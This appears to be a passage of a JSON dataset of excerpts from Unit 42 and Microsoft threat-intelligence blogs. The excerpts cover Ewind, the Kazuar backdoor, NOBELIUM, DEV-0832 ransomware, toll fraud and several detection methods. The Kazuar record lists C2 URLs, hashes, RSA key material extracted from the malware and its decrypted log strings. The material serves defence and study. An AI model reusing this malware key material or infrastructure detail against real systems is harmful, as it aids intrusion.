avoid targeting Russian subjects. Deliberate targeting of Russians, in this case \u2013 by an apparently Russian actor \u2013 is therefore somewhat unusual.\nWe have here an actor not only developing malware for monetization, but responsible for a network of Android App Store infrastructure which has over the years been used to serve tens of thousands of Android downloads in support of his advertising-supported monetization schemes.\nPalo Alto Networks customers are protected from the Ewind Trojan:\nWildFire properly classifies Ewind samples as malicious. \nC2 servers associated with this activity are blocked through Threat Prevention DNS signatures. \nDownload sites associated with this actor are categorized as Malware. \nAutoFocus customers can monitor this activity using the \"Ewind\" tag.", "source": "Palo"}, {"title": "Indicators", "content": "Ewind C2 Domains:\nmobincome[.]organdrowr[.]ru\nUnique string (APK Defined service):\nb93478b8cdba429894e2a63b70766f91\nWe cannot categorically state that all Android apps downloaded from the mentioned app store domains are Ewind, or even necessarily malicious. However, given the connection to this actor and his known activity, it may be appropriate to consider these low-reputation.\nIgnite '17 Security Conference: Vancouver, BC June 12\u201315, 2017\nIgnite '17 Security Conference is a live, four-day conference designed for today's security professionals. Hear from innovators and experts, gain real-world skills through hands-on sessions and interactive workshops, and find out how breach prevention is changing the security industry. Visit theIgnite websitefor more information on tracks, workshops and marquee sessions.", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 researchers have uncovered a backdoor Trojan used in an espionage campaign. The developers refer to this tool by the name Kazuar, which is a Trojan written using the Microsoft .NET Framework that offers actors complete access to compromised systems targeted by its operator. Kazuar includes a highly functional command set, which includes the ability to remotely load additional plugins to increase the Trojan's capabilities. During our analysis of this malware we uncovered interesting code paths and other artifacts that may indicate a Mac or Unix variant of this same tool also exists. Also, we discovered a unique feature within Kazuar: it exposes its capabilities through an Application Programming Interface (API)  to a built-in webserver.\nWe suspect the Kazuar tool may be linked to the Turla threat actor group (also known asUroburosand Snake), who have been reported to have compromised embassies, defense contractors, educational institutions, and research organizations across the globe. A hallmark of Turla operations is iterations of their tools and code lineage in Kazuar can betraced backto at least 2005. If the hypothesis is correct and the Turla threat group is using Kazuar, we believe they may be using it as a replacement for Carbon and its derivatives. Of the myriad of tools observed in use by Turla Carbon and its variants were typically deployed as a second stage backdoor within targeted environments and we believe Kazuar may now hold a similar role for Turla operations.", "source": "Palo"}, {"title": "Conclusion", "content": "While yet another fully featured backdoor alone is not particularly novel, the existence of a code path for Unix, combined with the portability of .NET Framework code makes the Kazuar Trojan an interesting tool to keep an eye on. Another interesting portion of this malware is its remote API that allows actors to issue commands to the compromised system via inbound HTTP requests. Based on our analysis, we believe that threat actors may compile Windows and Unix based payloads using the same code to deploy Kazuar against both platforms. Palo Alto Networks AutoFocus subscribers can explore additional samples using the Kazuar AutoFocus tag.", "source": "Palo"}, {"title": "Indicators", "content": "Hashes\n8490daab736aa638b500b27c962a8250bbb8615ae1c68ef77494875ac9d2ada2\nb51105c56d1bf8f98b7e924aa5caded8322d037745a128781fa0bc23841d1e70\nbf6f30673cf771d52d589865675a293dc5c3668a956d0c2fc0d9403424d429b2\ncd4c2e85213c96f79ddda564242efec3b970eded8c59f1f6f4d9a420eb8f1858\nURLs\nhttp://gaismustudija[.]lv/wp-includes/pomo/kontakti.php\nhttp://hcdh-tunisie[.]org/wp-includes/SimplePie/gzencode.php\nhttp://www.gallen[.]fi/wp-content/gallery/\nFile Activity\n%LOCALAPPDATA%\\/[a-f0-9]{32}\\/[a-f0-9]{32}\\.dll\n%LOCALAPPDATA%\\/[a-f0-9]{32}\\/[a-f0-9]{32}/\n%USERPROFILE%\\Start Menu\\Programs\\Startup\\*.lnk\nRSA Keys\n<RSAKeyValue><Modulus>gSI+OxtBrfXVfSRRSlNIMVYr9HFy40jokIDkUqffhU7Y/VcFB1nc8GwT4GOjK6lR/mJi3XcGg+nxqR9iLoeoOLgBFFz9O1l++81tPtRaVZ8yg+IzmZlaMhdOg0apatxhjRA/4pYOhZHwifQIjZzid6/+BgYIPBXWcX8e58l1PH+chm3DJzJ2gdHOsx6Dz9HHPr+sGLshAFF35ICb/11jq0vU9KU7CjYdf0Rvl16EDYyUQXbIG1ZMaTDzBrMcXZrBfXHEqn2Qwr4NiaDUwOwGCynBtSZXoNOfHArYxbRaBA269SPKhZgCBqdAhYfPFe2q8r8Y4fz21iZTqTngMsA2zw==</Modulus><Exponent>EQ==</Exponent><P>hGjs2pEZW4pN2b0Bm9xl84zxqQ2BMSflj2xpf5MH+XvCY5BBN3YROm24LYtGwy3xOdKeUJOENvYbkvirBcm2ecRxmLgE5AMMeWxZpOayUtOUd+Abx3+TT8giPG3sqEHtuaHVUjypBloE4EWnFWrmq0f3+Kpi8kHFxLul9jHubsc=</P><Q>+ap/8gRvidWrAhZcAiCAYdFZIt6hSwBz5ohU5ZSPomv9e/Urtts8cin+QeBvDwF6UvyP1vz3wxUOXycaBI3StCMjCXHuBLN+wfpEhfdt6KKywsmW7I5OdogIbVRLTUJvBtiXBGG3c10ay3H8TYx00lt6GgcLAJZMZE4mHEjnj7k=</Q><DP>D5PfoT4/N/InRsrxIWU5K7Y6jFvxFNeEaznuSz55aKUl7ZiAJKR6f1gzyR9xvJv+Qwm4RbcAfu/HAjtfahe7HWJnt50twHjUSoU3uQwU+q964O0wcdLGCWLW2e7QjEP92ZqRkTRQHt1p/ERuAoUMFCaVpMjAWLxxnqyqHPbQwb0=</DP><DQ>vuvLQJn68O6v8omRp0YH0lTLsUDVsdMrdA3mkXGbA7v+E38/i9TT3tTRfaugOKbG9CqMHN+QSeLs31oi9Gxz8yntnc+X5XozwYMlV2Lbk8e14D/Nw/RaHmgGcbjuSiO+UIeCiuFQDOzYQTkMO01KRoIwMgVixDay40rR2WTtT8k=</DQ><InverseQ>cfVixwsMog8F8CDikcYKNmUGNJPeJ4grdJi4ZIMX5mSuhdvSccTnx7JoCMJ2LKwFLyMnmZIIeYF4EYBgwHz6rumL8Zam6Zr04uIpxWL3MZyR9BImREmH6e6aFzHq/P02phU6tNbzkHMp6QGsfgtkLSmzOed0GsvfwAxCfD20PXU=</InverseQ><D>PMTR/bJ5Qs4KHMXL5r3Hnr8jvlOBW+YTFtM+RQO0evftpGUviv0crWAJWok9ujGP/z1bs4NOXDHbImkfJPSLZfw8vknglGZZ3+gzaNxmvuGBLwEJOTkbYt3KmCFAqsIPyemHebAG1XHam0WprA2Xv9pZbD8S7xlV2w6lIcg3K4ak6tNG2yKepoQ2DvFdF/ZTtOu0ybE+g8AA6UxWCy/liTLN2fxgVwP45XAAFIue/x6aF6m09gxi/xJaxwafEeonVZU9aaqpbyb5eeMixRSbkVuK2DZrF/lW9oedp0mYtI+E7nRyxykxFl3rrC9B8ETKBzNONPgB4PpuaSSdC0ELcQ==</D></RSAKeyValue>\n<RSAKeyValue><Modulus>m4SbvlZhH5UzcgDLIEIygjTCCQMxc/TrwUYZ5JA5SU2jtSBt9aqwljKJ7h4Tv5eP2Efy4Z+2QajDNtOThift4nVTWsl+iOoMKKV6pvQOFj6k2P4kRTBGo/t8J46j7DqnFeMHXUjhjv2RFnp1nms8thE6+MJsI0lnxYTLBip5mNbj+Jbr7vVzK8MKnjGxsr9FoRBVNyZM+ILFu3aO62z1a8PIrI4kqVVggD35oF4WdSrmVLFvec/1ej3Cx12NjqCXo3lZhwxlIKjFNMNtslXnk0o9L/ZlWlEjqXiez/3ryzpVBrlrtb9D+x1ZRtv58jtdSTE61//jtEb3mMUeTry+2w==</Modulus><Exponent>EQ==</Exponent></RSAKeyValue>\nDecrypted Log and Error Messages\n'{0}' autorun algorithm is not supported!\n'{0}' request method isn't supported.\nAccessed date mismatch in get command!\nAccessed date mismatch in list command!\nAction with identifier {0} is not implemented.\nAutorun command requeres autorun type to be set!\nAutorun failed due to {0}\nCmd command requires actual commands list!\nCommiting suicide...\nControl server address '{0}' is invalid.\nCopy command requires destination path!\nCopy command requires source path!\nCopying file from {0} to {1}...\nCreated date mismatch in get command!\nCreated date mismatch in list command!\nDirectory listing for {0}\nExecuting command with {0}...\nFailed to create agent due to {0}\nFailed to create channel due to {0}\nFailed to create injector due to {0}\nFatal failure due to {0}\nGetting file query {0}...\nGetting system information...\nGoing to sleep for {0}...\nGot '{0}' command from {1}.\nGot new '{0}' command.\nGot new task #{0} from {1}.\nHTTP listening isn't supported.\nIPC channel is not ready.\nInjected into explorer.\nInjected into {0} [{1}].\nInjecting into explorer...\nInjecting into {0} [{1}]...\nInjection failed due to {0}\nInstalling plugin...\nInvalid FTP server status ({0}).\nInvalid last contact time.\nInvalid or unknown action format ({0})!\nInvalid sender interval.\nKazuar's {0} started in process {1} [{2}] as user {3}/{4}.\nKilling processes...\nList command requires file query string!\nListening\nListing plugins...\nListing processes...\nMax interval value is less than min value!\nMax interval value is more than supported!\nMin interval value is less than supported!\nModified date mismatch in get command!\nModified date mismatch in list command!\nMove command requires destination path!\nMove command requires source path!\nMoving file from {0} to {1}...\nMozilla/5.0 (Windows NT {0}.{1}; rv:22.0) Gecko/20130405 Firefox/23.0\nMozilla/5.0 (X11; {0} {1}; rv:24.0) Gecko/20100101 Firefox/24.0\nNew plugin {0} was installed.\nNo servers available now.\nPlugin command requires payload!\nPlugin installed.\nPlugin removed.\nPlugin {0} was removed.\nPlugin {0} was started.\nPlugout command requires plugin name string!\nProc kill command requires name or pid to be set!\nProcess {0} [{1}] exited with {2} code.\nProcess {0} [{1}] impersonated.\nPut command requires correct file path!\nPut command requires payload!\nPutting file to {0}...\nRemote control failed due to {0}\nRemote failed due to {0}\nRemote iteration failed due to {0}\nRemote request from {0} failed due to {1}\nRemove command requires file path!\nRemoving file {0}...\nRemoving plugin...\nRequest was sent to {0}.\nResult #{0} was sent to {1}.\nResult #{0} was taken by {1}.\nRun command requires executable path!\nRun-time error {0}:{1:X8}.\nRun-time error {0}:{1}.\nScheme '{0}' is not supported!\nSearching file query {0}...\nSend iteration failed due to {0}\nSending request to {0}...\nSending result #{0} to {1}...\nServer command requires at least one server!\nSetting agent id to {0}...\nSetting autorun type to {0}...\nSetting remote type to {0}...\nSetting transport interval to [{0} - {1}]...\nSetting transport processes:\nSetting transport servers:\nShellcode error {0:X16}.\nSleep interval is longer than supported!\nSolving task #{0}...\nStartup path is empty.\nTaking screen shot...\nTaking webcam shot...\nTask #{0} execution finished.\nTask #{0} execution started:\nTask #{0} failed due to {1}\nTask #{0} solved.\nTransport command requires at least one process name!\nTransport process name '{0}' is invalid.\nTransport processes\nUnable to create capture window.\nUnable to delete task #{0} file due to {1}\nUnable to execute command due to {0}\nUnable to execute task #{0} due to {1}\nUnable to get last contact time due to {0}\nUnable to get task from {0} due to {1}\nUnable to impersonate {0} [{1}] due to {2}\nUnable to return logs due to {0}\nUnable to send result #{0} to {1} due to {2}\nUnable to start plugin {0} due to {1}\nUnable to stop plugin {0} due to {1}\nUnable to store agent id due to {0}\nUnable to store autorun type due to {0}\nUnable to store interval due to {0}\nUnable to store remote type due to {0}\nUnable to store servers due to {0}\nUnable to store transports due to {0}\nUnhandled exception {0}\nUpgrade command requires payload!\nUpgrading agent...\nUsing default agent id due to {0}\nUsing default autorun type due to {0}\nUsing default interval due to {0}\nUsing default remote type due to {0}\nUsing default servers due to {0}\nUsing default transports due to {0}\nUuid command requires identifier!\nWaiting for shellcode failed.\nWaiting for window '{0}' failed.\nexplorer.exe, {0}\nERROR: {0}\nPlugin {0}\n{0} doesn't exist!\n{0} was skipped.\nproc - {0} [{1}]\ntime - {0}\nuser - {0}/{1} ({2})\nRegister for Ignite '17 Security ConferenceVancouver, BC June 12\u201315, 2017\nIgnite '17 Security Conference is a live, four-day conference designed for today's security professionals. Hear from innovators and experts, gain real-world skills through hands-on sessions and interactive workshops, and find out how breach prevention is changing the security industry. Visit theIgnite websitefor more information on tracks, workshops and marquee sessions.", "source": "Palo"}, {"title": "Introduction", "content": "To keep Microsoft's game development studios and their customers safe, we recently conducted an application security review of Helix Core Server, the source code management platform relied on by most of our studios. For our security review, we analyzed Helix Core Server version 2023.1.244.2900 and installed it on Windows 11 22H2. We used Helix Core Server's default installation options, which resulted by-design in the Helix Core Server service running as LocalSystem: ", "source": "microsoft"}, {"title": "Defense", "content": "In addition to following Perforce's guidance on \"Securing the server\", Microsoft recommends adhering to the following defense-in-depth tactics to minimize the risk of exploitation of these or other Perforce Helix Core Server vulnerabilities. \nRegularly monitor for and apply patches for third-party software.   \nUse a VPN and/or an IP allow-list to limit who can communicate with your Perforce Helix Core Server.   \nIssue TLS certificates to legitimate Perforce users and use a TLS termination proxy in front of Perforce Helix Core Server to validate client's TLS certificates before allowing them to connect to Perforce Server.   \nLog all access to your Helix Core Server, both via your network appliances and via Perforce Helix Core Server itself.   \nConfigure alerting to notify IT administrators and your security team if the Helix Core Server process crashes.   \nUse network segmentation to ensure that if your Helix Core Server is compromised, an attacker's ability to pivot in your network is limited. ", "source": "microsoft"}, {"title": "Introduction", "content": "Observing a sudden, relatively large count of Event ID 4625 associated with RDP network connections might be rare, but it does not necessarily imply that a machine is under attack. For example, a script that performs the following actions would look suspicious looking at a time series of counts of failed sign-in but is most likely not malicious: \nuses an expired password retries sign-in attempts every N-minutes with different usernames over a public IP address within a range owned by the enterprise \nIn contrast, behavior that includes the following is indicative of an attack: \nextreme counts of failed sign-ins from many unknown usernames   \nnever previously successfully authenticated   \nfrom multiple RDP connections   \nfrom new source IP addresses \nUnderstanding the context of failed sign-ins and inbound connections is key to discriminating between true positive (TP) and false positive (FP) brute force attacks, especially if the goal is to automatically raise only high-precision alerts to the appropriate recipients, as we do in Microsoft Defender ATP. \nWe analyzed several months' worth of data to mine insights into the types of RDP brute force attacks occurring across Microsoft Defender ATP customers. Out of about 45,000 machines that had both RDP public IP connections and at least 1 network failed sign-in, we discovered that, on average, several hundred machines per day had high probability of undergoing one or more RDP brute force attack attempts. Of the subpopulation of machines with detected brute force attacks, the attacks lasted 2-3 days on average, with about $90\\%$ of cases lasting for 1 week or less, and less than $5\\%$ lasting for 2 weeks or more. \nAs discussed in numerous other studies [1], large counts of failed sign-ins are often associated with brute force attacks. Looking at the count of daily failed sign-ins, $90\\%$ of cases exceeded 10 attempts, with a median larger than 60. In addition, these unusual daily counts had high positive correlation with extreme counts in shorter time windows (see Figure 2). In fact, the number of extreme failed sign-ins per day typically occurred under 2 hours, with about $40\\%$ failing in under 30 minutes. \nWhile a detection logic based on thresholding the count of failed sign-ins during daily or finer grain time window can detect many brute force attacks, this will likely produce too many false positives. Worse, relying on just this will yield false negatives, missing successful enterprise compromises: our analysis revealed several instances where brute force attacks generated less than 5-10 failed attempts at a daily granularity but often persisted for many days, thereby avoiding extreme counts at any point in time. For such a brute force attack, thresholding the cumulative number of failed sign-ins across time could be more useful, as depicted in Figure 3. \nData science for cybersecurity: A probabilistic time series model for detecting RDP inbound brute force attacks | Microsoft Se Looking at counts of network failed sign-ins provides a useful but incomplete picture of RDP brute force attacks. This can be further augmented with additional information on the failed sign-in, such as the failure reason, time of day, and day of week, as well as the username itself. An especially strong signal is the source IP of the inbound RDP connection. Knowing if the external IP has a high reputation of abuse, as can be looked up on sites like https://www.abuseipdb.com/, can directly confirm if an IP is a part of an active brute force. \nUnfortunately, not all IP addresses have a history of abuse; in addition, it can be expensive to retrieve information about many external IP addresses on demand. Maintaining a list of suspicious IPs is an option, but relying on this can result in false negatives as, inevitably, new IPs continually occur, particularly with the adoption of cloud computing and ease of spinning up virtual machines. A generic signal that can augment failed sign-in and user information is counting distinct RDP connections from external IP addresses. Again, extreme values occurring at a given time or cumulated over time can be an indicator of attack. \nFigure 4 shows histograms (i.e., counts put into discrete bins) of daily counts of RDP public connections per machine that occurred for an example enterprise with known brute force attacks. It's evident that normal machines have a lower probability of larger counts compared to machines attacked. \nGiven that some enterprises have machines under brute force attack daily, the priority may be to focus on machines that have been compromised, defined by a first successful sign-in following failed attempts from suspicious source IP addresses or unusual usernames. In Windows logs, Event ID 4624 can be leveraged to measure successful sign-in events for local machine in combination with failed sign-ins (Event ID 4625). \nOut of the hundreds of machines with RDP brute force attacks detected in our analysis, we found that about . $08\\%$ were compromised. Furthermore, across all enterprises analyzed over several months, on average about 1 machine was detected with high probability of being compromised resulting from an RDP brute force attack every 3-4 days. Figure 5 shows a bubble chart of the average abuse score of external IPs associated with RDP brute force attacks that successfully compromised machines. The size of the bubbles is determined by the count of distinct machines across the enterprises analyzed having a network connection from each IP. While there is diversity in the origin of the source IPs, Netherlands, Russia, and the United Kingdom have a larger concentration of inbound RDP connections from high-abuse IP. \nA key takeaway from our analysis is that successful brute force attempts are not uncommon; therefore, it's critical to monitor at least the suspicious connections and unusual failed sign-ins that result in authenticated sign-in events. In the following sections we describe a methodology to do this. This methodology was leveraged by Microsoft Threat Experts to augment threat hunting and resulted in new targeted attack notifications. ", "source": "microsoft"}, {"title": "Introduction", "content": "First introduced by Apple in macOS Yosemite, SIP-also known as \"rootless\"- essentially locks down the system from root by leveraging the Apple sandbox to protect the entire platform. Internally, it is controlled by the following NVRAM variables: \ncsr-active-config: bitmask of enabled protections csr-data: stores netboot configuration \nThese variables cannot be legitimately modified in non-recovery mode. Therefore, the only legitimate way to disable SIP is by booting into recovery mode and turning SIP off. Turning SIP on or off is done using the built-in csrutil tool, which can also display the SIP status: \nThe csr-active-config bitmask NVRAM variable describes the different protections SIP offers. While not an exhaustive list, below are a few honorable mentions; the rest can be freely examined in the XNU source code: \nCompromising any of these protections could enable attackers to bypass SIP completely. Some scenarios include the following: \nLoading untrusted kernel extensions could compromise the kernel and allow the said extensions to perform operations without any checks \nMicrosoft finds new macOS vulnerability, Shrootless, that could bypass System Integrity Protection | Microsoft Security Blog Bypassing filesystem checks could allow a kernel extension to enforce SIP to itself completely Freely modifying the NVRAM could control SIP itself ", "source": "microsoft"}, {"title": "Introduction", "content": "A key trait of NOBELIUM's ongoing activity over the last year has been the abuse of indirect paths and trust relationships to target and gain access to victims of interest for intelligence gain. In the most recent campaign, this has manifested in a compromise-one-to-compromise-many approach-exploiting the service providers' trust chain to gain broad access to multiple customer tenants for subsequent attacks. NOBELIUM leverages established standard business practices, to target downstream customers across multiple managed tenants. These delegated administrative privileges are often neither audited for approved use nor disabled by a service provider or downstream customer once use has ended, leaving them active until removed by the administrators. If NOBELIUM has compromised the accounts tied to delegated administrative privileges through other credential-stealing attacks, that access grants actors like NOBELIUM persistence for ongoing campaigns. \nIn one example intrusion chain observed by MSTIC during this campaign, the actor was observed chaining together artifacts and access across four distinct providers to reach their end target. The example demonstrates the breadth of techniques that the actor leverages to exploit and abuse trust relationships to accomplish their objective. \nMicrosoft assesses that organizations, such as cloud service providers and other technology organizations who manage services on behalf of downstream customers, will be of continued interest to persistent threat actors and are at risk for targeting via a variety of methods, from credential access to targeted social engineering via legitimate business processes and procedures. For additional information on how to identify and triage delegated administrative privileges, see the mitigations and recommendations below. ", "source": "microsoft"}, {"title": "defend", "content": "Microsoft 365 Defender provides detection for one of the cloud persistence techniques commonly used by NOBELIUM. That persistence technique relies on maintaining access to victims' mail system through the modification of permissions and addition of hidden credentials that allow the attacker to access emails remotely. This alert is based on a combination of multiple signals and telemetry that originates from Microsoft Cloud App Security and is triggered either based on the risk score of the account involved or based on the suspicious IP address used to access emails. \nDetection Name: Suspicious Addition of an Exchange related App Role Description: Addition of an Exchange related application role was observed. An account that can authenticate against an application service principal may also be able to access Exchange data and email. This alert was triggered based on another Microsoft Cloud App Security alert related to the potentially compromised user account. ", "source": "microsoft"}, {"title": "defend", "content": "Azure Defender provides detections for abuse of legitimate virtual machine extensions once an attacker has obtained token or valid credentials. Through deep analysis of Azure activity logs, Azure Defender analyzes every call made by authenticated and authorized principals and calculates a likelihood score to determine suspicious intent of the operation and detect it. \nDetection Name: Suspicious Run Command invocation detected Description: Azure Defender for Resource Manager identified a suspicious Run Command invocation in your subscription. Azure Run Command is a feature designed to allow administrators to efficiently manage their environments. While this activity may be legitimate, an attacker with sufficient permissions can utilize Run Command to execute malicious code on your virtual machine. This activity is deemed suspicious as the user rarely invokes operations that enable code execution. This can indicate the account is compromised and is being used with malicious intent. \nMicrosoft continues to track NOBELIUM's activities, tactics, malware, and tools.  We will communicate any additional insights and recommendations as we investigate their actions against our customers. We reinforce the importance of best practice security precautions such as Zero-trust architecture and multi-factor authentication and their importance for everyone. Additional information on best practice security priorities is listed below: ", "source": "microsoft"}, {"title": "Introduction", "content": "The aggressive campaign began early in the morning of Wednesday, November 14. The targeting appeared to focus on organizations that are involved with policy formulation and politics or have some influence in that area. \nAlthough targets are distributed across the globe, majority are located in the United States, particularly in and around Washington, D.C. Other targets are in Europe, Hong Kong, India, and Canada. \nThe spear-phishing emails mimicked sharing notifications from OneDrive and, as noted by Reuters, impersonated the identity of individuals working at the United States Department of State. If recipients clicked a link on the spear-phishing emails, they began an exploitation chain that resulted in the implantation of a DLL backdoor that gave the attackers remote access to the recipients' machines. ", "source": "microsoft"}, {"title": "Protection", "content": "Microsoft Threat Protection is a comprehensive solution for enterprise networks, protecting identities, endpoints, user data, cloud apps, and infrastructure. By integrating Microsoft services, Microsoft Threat Protection facilitates signal sharing and threat remediation across services. In this attack, Office 365 Advanced Threat Protection and Windows Defender Advanced Threat Protection quickly mitigated the threat at the onset through durable behavioral protections. \nOffice 365 ATP has enhanced phishing protection and coverage against new threats and polymorphic variants. Detonation systems in Office 365 ATP caught behavioral markers in links in the emails, allowing us to successfully block campaign emails- including first-seen samples-and protect targeted customers. Three existing behavioral-based detection algorithms quickly determined that the URLs were malicious. In addition, Office 365 ATP uses security signals from Windows Defender ATP, which had a durable behavior-based antivirus detection   \n(Behavior:Win32/Atosev.gen!A) for the second-stage malware. If you are not already secured against advanced cyberthreat campaigns via email, begin a free Office 365 E5 trial today. \nSafe Links protection in Office 365 ATP protects customers from attacks like this by analyzing unknown URLs when customers try to open them. Zero-hour Auto Purge (ZAP) actively removes emails post-delivery after they have been verified as malicious-this is often critical in stopping attacks that weaponize embedded URLs after the emails are sent. \nAll of these protections and signals on the attack entry point are shared with the rest of the Microsoft Threat Protection components. Windows Defender ATP customers would see alerts related to the detection of the malicious emails by Office 365 ATP, as well the behavior-based antivirus detection. \nWindows Defender ATP detects known filesystem and network artifacts associated with the attack. In addition, the actions of the LNK file are detected behaviorally. Alerts with the following titles are indicative of this attack activity: \nArtifacts associated with an advanced threat detected Network activity associated with an advanced threat detected Low-reputation arbitrary code executed by signed executable Suspicious LNK file opened \nNetwork protection blocks connections to malicious domains and IP addresses. The following attack surface reduction rule also blocks malicious activities related to this attack: \nBlock executable files from running unless they meet a prevalence, age, or trusted list criteria \nAnalysis of cyberattack on U.S. think tanks, non-profits, public sector by unidentified attackers | Microsoft Security Through Windows Defender Security Center, security operations teams could investigate these alerts and pivot to machines, users, and the new Incidents view to trace the attack end-to-end. Automated investigation and response capabilities, threat analytics, as well as advanced hunting and new custom detections, empower security operations teams to defend their networks from this attack. To test how Windows Defender ATP can help your organization detect, investigate, and respond to advanced attacks, sign up for a free Windows Defender ATP trial. \nThe following Advanced hunting query can help security operations teams search for any related activities within the network: \nThe provided queries check events from the past ten days. Change EventTime to focus on a different period. ", "source": "microsoft"}, {"title": "Introduction", "content": "To understand toll fraud malware, we need to know more about the billing mechanism that attackers use. The commonly used type of billing in toll fraud is Wireless Application Protocol (WAP). WAP billing is a payment mechanism that enables consumers to subscribe to paid content from sites that support this protocol and get charged directly through their mobile phone bill. The subscription process starts with the customer initiating a session with the service provider over a cellular network and navigating to the website that provides the paid service. As a second step, the user must click a subscription button, and, in some cases, receive a one-time password (OTP) that has to be sent back to the service provider to verify the subscription. The overall process is depicted below: \nIt should be noted that the process depends on the service provider, thus not all steps are always present. For example, some providers do not require an OTP, which means that the mobile user can subscribe to a service by simply clicking the subscription button while the device is connected to a cellular network. ", "source": "microsoft"}, {"title": "Conclusion", "content": "Toll fraud has been one of the most prevalent types of Android malware in Google Play Store since 2017, when families like Joker and their variants made their first appearance. It accounted for $34.8\\%$ of installed Potentially Harmful Application (PHA) from the Google Play Store in the first quarter of 2022, ranking second only to spyware. \nBy subscribing users to premium services, this malware can lead to victims receiving significant mobile bill charges. Affected devices also have increased risk because this threat manages to evade detection and can achieve a high number of installations before a single variant gets removed. \nWith this blog, we want to inform end users about the details of this threat and how they can protect themselves from toll fraud. We also aim to provide security analysts with guidance on how to identify other malicious applications that use these techniques. \nOur in-depth analysis of this threat and its continuous evolution informs the protection we provide through solutions like Microsoft Defender for Endpoint on Android. \nLearn how Microsoft Defender for Endpoint provides cross-platform security, including mobile threat defense capabilities. \nDimitrios Valsamaras and Sang Shin Jung Microsoft 365 Defender Research Team ", "source": "microsoft"}, {"title": "Introduction", "content": "Star Blizzard persistently introduces new techniques to avoid detection. These TTPs are employed for brief periods and are either modified or abandoned once they become publicly known. \nMicrosoft has identified the following evasive techniques used by Star Blizzard in campaigns in 2024: \nUse of multiple registrars to register domain infrastructure Use of multiple link-shortening services and legitimate websites with open redirects, to hide actor-registered domains Use of altered legitimate email templates as spear-phishing lures ", "source": "microsoft"}, {"title": "Introduction", "content": "Microsoft has identified multiple campaigns attributed to DEV-0832 over the past year based on the use of a unique PowerShell file name, staging directories, and ransom payloads and their accompanying notes. To gain an initial foothold in compromised networks, DEV-0832 has reportedly exploited vulnerable web-facing applications and used valid accounts. However, due to limited initial signals from affected organizations, Microsoft has not confirmed these attack vectors. Attackers then use custom PowerShell scripts, commodity tools, exploits for disclosed vulnerabilities, and native Windows binaries to gather privileged credentials, move laterally, collect and exfiltrate data, and deploy ransomware. \nAfter deploying ransomware, DEV-0832 demands a ransom payment, threatening to leak stolen data on the group's [.]onion site. In some cases, Microsoft observed that DEV-0832 did not deploy ransomware. Instead, the actors appeared to exfiltrate data and dwell within compromised networks. The group sometimes avoids a ransomware payload in favor of simple extortion-threatening to release stolen data unless a payment is made. \nThe group also goes to significant measures to ensure that an organization cannot recover from the attack without paying the ransom: Microsoft has observed DEV0832 access two domain administrator accounts and reset user passwords of over 150,000 users, essentially locking out legitimate users before deploying ransomware to some devices. This effectively interrupts remediation efforts, including attempts to prevent the ransomware payload or post-compromise incident response. ", "source": "microsoft"}, {"title": "Introduction", "content": "Microsoft tracks the destructive actions documented in this blog post as DEV-1084. DEV-1084 likely worked in partnership with MERCURY-an Iran-based actor that the US Cyber Command has publicly linked to Iran's Ministry of Intelligence and Security (MOIS). DEV-1084 publicly adopted the DarkBit persona and presented itself as a criminal actor interested in extortion, likely as an attempt to obfuscate Iran's link to and strategic motivation for the attack. \nThe link between the DEV-1084 cluster and MERCURY was established based on the following evidence: \nDEV-1084 operators were observed sending threatening emails from 146.70.106[.]89, an IP address previously linked to MERCURY. DEV-1084 used MULLVAD VPN, the same VPN provider historically used by MERCURY. DEV-1084 used Rport and a customized version of Ligolo. MERCURY has also been observed using Rport and a similar version of Ligolo in previous attacks. DEV-1084 used the vatacloud[.]com domain for command and control (C2) during this incident. Microsoft assesses with high-confidence that the vatacloud[.]com domain is controlled by MERCURY operators. \nMicrosoft assesses that MERCURY gains access to the targets through remote exploitation of an unpatched internet-facing device. MERCURY then handed off access to DEV-1084. It is not currently clear if DEV-1084 operates independently of MERCURY and works with other Iranian actors or if DEV-1084 is an 'effects based' sub-team of MERCURY that only surfaces when MERCURY operators are instructed to carry out a destructive attack. ", "source": "microsoft"}, {"title": "defend", "content": "The following alerts in Microsoft 365 Defender can be used to detect suspicious operations in Azure related to the attacker activities described in this blog, including destructive activity: \nAccess elevation by risky user Suspicious Azure resource deletions Suspicious Addition of an Exchange related App Role \nIn addition, the following alert can help detect compromised Azure AD Connect accounts: \nUnusual activities by Azure AD Connect sync account ", "source": "microsoft"}, {"title": "defend", "content": "The following Microsoft Defender for Identity alerts can indicate associated threat activity: \nSuspicious additions to sensitive groups \nFor relevant accounts with Honeytoken configured, the following alert can indicate malicious activity: \nHoneytoken activity ", "source": "microsoft"}, {"title": "Introduction", "content": "In March this year, Microsoft 365 Defender successfully blocked a file that would later be confirmed as a variant of the GoldMax malware. GoldMax, a commandand-control backdoor that persists on networks as a scheduled task impersonating systems management software, is part the of tools, tactics, and procedures (TTPs) of NOBELIUM, the threat actor behind the attacks against SolarWinds in December 2020. \nMicrosoft was able to proactively defend its customers from this newly discovered GoldMax variant because it leveraged two main technologies: fuzzy hashing, which serves as the input, and deep learning techniques inspired by NLP and computer vision, among others. \nThe earliest GoldMax sample, which Microsoft detects as   \nTrojan:Win64/GoldMax.A!dha, was first submitted on VirusTotal in September 2020. While the new file was confirmed to be GoldMax variant in June 2021, or three months after Microsoft first blocked it, we started defending customers as soon as we saw it. As seen in the screenshots below, the new file's TLSH and SSDEP hashes -the fuzzy hashes exposed on VirusTotal-are observably similar to the first GoldMax variant. Both files also have the exact ImpHash and file size, further supporting our initial conclusion that the second file is also part of the GoldMax family. \nIn the next sections, we discuss fuzzy hashes and how we use them in conjunction with deep learning to detect new and unknown threats. ", "source": "microsoft"}, {"title": "Introduction", "content": "On Windows systems, most methods attackers use to run code within another process fall within two classes: process injection and process hollowing. These classes allow attackers to run their code within another process without explicitly creating it from an executable, or making it load a dynamic link library (DLL).  Similar classes of techniques are often also called process injection, but this term will be used in a more specific definition for clarity. ", "source": "microsoft"}, {"title": "defend", "content": "The two primitives discussed earlier can now be combined into detection logic. First, the absence of the GUID_ECP_CREATE_USER_PROCESS ECP will verify if the process was created using the legacy API NtCreateProcessEx. Then, the function MmDoesFileHaveUserWritableReferences checks if the file's image section is backed by the page file, confirming that the process was created while the file is in a transient state. Meeting both conditions can determine that TOCTOU has been abused, whether by any of the published techniques, or a variation of it that uses similar concepts but abuses a functionality built into a driver to create a similar effect. \nMicrosoft Defender for Endpoint can detect each of the known techniques in this class of stealthy process execution and gives out a specific alert for variations of process ghosting, herpaderping, and doppelganging found in the wild. Apart from the specific alerts for each variation, detections exist for the generalized flow and any abuse of the legacy process creation API, including unpublished variations. \nThis blog post shares Windows internals 